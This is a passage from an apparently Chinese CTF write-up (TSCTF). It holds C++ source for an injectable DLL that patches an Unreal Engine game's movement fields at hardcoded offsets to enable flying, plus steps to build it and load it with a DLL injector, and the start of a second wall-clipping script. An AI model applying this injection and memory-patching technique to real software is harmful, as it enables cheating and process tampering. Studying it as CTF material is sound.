class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;BasicType.h&quot;</span>   <span class="comment">// UEDumper 导出的基础类型，提供 TArray 等模板</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 简易前向声明 -----------------------------------------------------------</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UWorld</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UGameInstance</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ULocalPlayer</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">APlayerController</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">APawn</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ACharacter</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UCharacterMovementComponent</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">FVector</span> &#123; <span class="type">float</span> X, Y, Z; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 之前我们发现的状态</span></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">EMovementMode</span> : <span class="type">uint8_t</span> &#123;</span><br><span class="line">    MOVE_None = <span class="number">0</span>,</span><br><span class="line">    MOVE_Walking = <span class="number">1</span>,</span><br><span class="line">    MOVE_NavWalking,</span><br><span class="line">    MOVE_Falling,</span><br><span class="line">    MOVE_Swimming,</span><br><span class="line">    MOVE_Flying,</span><br><span class="line">    MOVE_Custom</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 偏移常量（来自 merged_AudioMixer_Engine_UMG_MovieScene_MovieSceneTracks.h） ---</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">uintptr_t</span> OFFSET_GWORLD = <span class="number">0x49EE370</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UWORLD_OWNING_GI = <span class="number">0x180</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UGAMEINSTANCE_LOCALPLAYERS = <span class="number">0x38</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ULOCALPLAYER_PLAYERCONTROLLER = <span class="number">0x30</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_APLAYERCONTROLLER_ACKPAWN = <span class="number">0x2A0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ACHARACTER_CHARACTERMOVEMENT = <span class="number">0x288</span>;          <span class="comment">// 角色移动</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_MOVEMENTMODE = <span class="number">0x168</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_DEFAULTLANDMODE = <span class="number">0x384</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_PENDINGLAUNCHVELOC = <span class="number">0x3C0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_LASTUPDATEVELOC = <span class="number">0x25C</span>; <span class="comment">// LastUpdateVelocity</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 全局状态 ---------------------------------------------------------------</span></span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_running&#123; <span class="literal">true</span> &#125;;</span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_flyEnabled&#123; <span class="literal">false</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 便捷访问函数 -----------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">uintptr_t</span> <span class="title">GetModuleBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">uintptr_t</span> base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uintptr_t</span>&gt;(::<span class="built_in">GetModuleHandleW</span>(<span class="literal">nullptr</span>));</span><br><span class="line">    <span class="keyword">return</span> base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据偏移找GWorld</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UWorld* <span class="title">GetWorld</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UWorld**&gt;(<span class="built_in">GetModuleBase</span>() + OFFSET_GWORLD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取实例，拿本地玩家列表，我们要拿[0]</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UGameInstance* <span class="title">GetGameInstance</span><span class="params">(UWorld* world)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!world) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UGameInstance**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(world) + OFFSET_UWORLD_OWNING_GI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> TArray&lt;ULocalPlayer*&gt;&amp; <span class="title">GetLocalPlayers</span><span class="params">(UGameInstance* gi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">reinterpret_cast</span>&lt;TArray&lt;ULocalPlayer*&gt;*&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(gi) + OFFSET_UGAMEINSTANCE_LOCALPLAYERS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> APlayerController* <span class="title">GetPlayerController</span><span class="params">(ULocalPlayer* lp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;APlayerController**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(lp) + OFFSET_ULOCALPLAYER_PLAYERCONTROLLER);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这一帧实际被控制的 Pawn，拿到这个指针就能访问 ACharacter</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> ACharacter* <span class="title">GetAcknowledgedCharacter</span><span class="params">(APlayerController* pc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;ACharacter**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(pc) + OFFSET_APLAYERCONTROLLER_ACKPAWN);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UCharacterMovementComponent* <span class="title">GetCharacterMovement</span><span class="params">(ACharacter* character)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UCharacterMovementComponent**&gt;(</span><br><span class="line">        <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(character) + OFFSET_ACHARACTER_CHARACTERMOVEMENT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 写飞行相关字段 ---------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ApplyFlyState</span><span class="params">(UCharacterMovementComponent* movement, <span class="type">bool</span> enable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!movement) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(movement);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span>&amp; movementMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; defaultLandMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_DEFAULTLANDMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; pendingLaunchVelocity = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_PENDINGLAUNCHVELOC);</span><br><span class="line">    <span class="keyword">auto</span>&amp; lastUpdateVelocity = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_LASTUPDATEVELOC);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (enable) &#123;</span><br><span class="line">        movementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">        defaultLandMode = EMovementMode::MOVE_Flying;</span><br><span class="line">        pendingLaunchVelocity = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">800.f</span> &#125;;</span><br><span class="line">        lastUpdateVelocity = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">600.f</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        movementMode = EMovementMode::MOVE_Walking;</span><br><span class="line">        defaultLandMode = EMovementMode::MOVE_Walking;</span><br><span class="line">        pendingLaunchVelocity = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">        lastUpdateVelocity = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 持续维持飞行状态，防止游戏自动还原</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SustainFly</span><span class="params">(UCharacterMovementComponent* movement)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!movement) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(movement);</span><br><span class="line">    <span class="keyword">auto</span>&amp; movementMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; lastUpdateVelocity = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_LASTUPDATEVELOC);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// movementMode 本质是 *(EMovementMode*)(base + 0x168) 的别名,base 指向 UCharacterMovementComponent 的起始地址. base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE 跳到 MovementMode 字段； reinterpret_cast&lt;EMovementMode*&gt; 把那块内存视为 EMovementMode * ；</span></span><br><span class="line">    <span class="comment">// 通过引用赋值 movementMode = EMovementMode::MOVE_Flying; 就是把那 1 字节的内存直接写成飞行枚举。</span></span><br><span class="line">    movementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">    <span class="keyword">if</span> (lastUpdateVelocity.Z &lt; <span class="number">300.f</span>) &#123;</span><br><span class="line">        lastUpdateVelocity.Z = <span class="number">400.f</span>; <span class="comment">// 给一点上升速度</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 热键线程 ---------------------------------------------------------------</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">FlyThread</span><span class="params">(LPVOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (g_running) &#123;</span><br><span class="line">        <span class="keyword">if</span> (::<span class="built_in">GetAsyncKeyState</span>(VK_F6) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (!gi) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">            <span class="keyword">if</span> (!players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) || !players[<span class="number">0</span>]) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!pc) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">            <span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character);</span><br><span class="line">            g_flyEnabled = !g_flyEnabled.<span class="built_in">load</span>();</span><br><span class="line">            <span class="built_in">ApplyFlyState</span>(movement, g_flyEnabled);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            玩家切关、死亡重生、切换 Pawn 时，GWorld、GameInstance、LocalPlayers 乃至 AcknowledgedPawn 都可能变；如果只在按热键那一刻取一次指针，等角色重建后就指向旧对象，易崩溃或写不到新角色。</span></span><br><span class="line"><span class="comment">            循环里每次重新取 GWorld→GameInstance→LocalPlayer→PlayerController→Pawn→Movement，能在状态变化时自动跟上，确保对当前角色生效，也避免解引用野指针。</span></span><br><span class="line"><span class="comment">            用 TArray::IsValidIndex 防御空指针，配合持续刷新 MovementMode 就能稳定维持飞行。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (g_flyEnabled) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (gi) &#123;</span><br><span class="line">                <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">                <span class="keyword">if</span> (players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) &amp;&amp; players[<span class="number">0</span>]) &#123;</span><br><span class="line">                    <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">                    <span class="keyword">if</span> (pc) &#123;</span><br><span class="line">                        <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">                        <span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character);</span><br><span class="line">                        <span class="built_in">SustainFly</span>(movement);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        std::this_thread::<span class="built_in">sleep_for</span>(std::chrono::<span class="built_in">milliseconds</span>(<span class="number">20</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE <span class="keyword">module</span>, DWORD reason, LPVOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (reason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        ::<span class="built_in">DisableThreadLibraryCalls</span>(<span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line">        ::<span class="built_in">MessageBoxW</span>(<span class="literal">nullptr</span>,</span><br><span class="line">            <span class="string">L&quot;TSCTF DLL 注入成功\nF6 切换飞行模式&quot;</span>,</span><br><span class="line">            <span class="string">L&quot;TSCTF Helper&quot;</span>,</span><br><span class="line">            MB_OK | MB_ICONINFORMATION);</span><br><span class="line"></span><br><span class="line">        ::<span class="built_in">CreateThread</span>(<span class="literal">nullptr</span>, <span class="number">0</span>, FlyThread, <span class="literal">nullptr</span>, <span class="number">0</span>, <span class="literal">nullptr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (reason == DLL_PROCESS_DETACH) &#123;</span><br><span class="line">        g_running = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>visual studio新建dll项目</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014221722121.png" alt="image-20251014221722121"></p><p>注意引如BasicType.h</p><p>然后生成项目</p><p>relase x64</p><p>然后找工具注入</p><p>如：</p><p><a href="https://github.com/DarthTon/Xenos">DarthTon&#x2F;Xenos: Windows dll injector</a></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014211218244.png" alt="image-20251014211218244"></p><p>注入即可</p><p>按F6起飞</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014211202488.png"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014211105377.png" alt="image-20251014211105377"></p><p>这里再添加一个脚本兼容穿墙和起飞</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014222324466.png" alt="image-20251014222324466"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014223118044.png" alt="image-20251014223115885"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;BasicType.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UWorld</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UGameInstance</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ULocalPlayer</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">APlayerController</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">APawn</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ACharacter</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UCharacterMovementComponent</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UCapsuleComponent</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">FVector</span> &#123; <span class="type">float</span> X, Y, Z; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">EMovementMode</span> : <span class="type">uint8_t</span> &#123;</span><br><span class="line">    MOVE_None = <span class="number">0</span>,</span><br><span class="line">    MOVE_Walking = <span class="number">1</span>,</span><br><span class="line">    MOVE_NavWalking,</span><br><span class="line">    MOVE_Falling,</span><br><span class="line">    MOVE_Swimming,</span><br><span class="line">    MOVE_Flying,</span><br><span class="line">    MOVE_Custom</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">ECollisionEnabled</span> : <span class="type">uint8_t</span> &#123;</span><br><span class="line">    NoCollision = <span class="number">0</span>,</span><br><span class="line">    QueryOnly = <span class="number">1</span>,</span><br><span class="line">    PhysicsOnly = <span class="number">2</span>,</span><br><span class="line">    QueryAndPhysics = <span class="number">3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">uintptr_t</span> OFFSET_GWORLD = <span class="number">0x49EE370</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UWORLD_OWNING_GI = <span class="number">0x180</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UGAMEINSTANCE_LOCALPLAYERS = 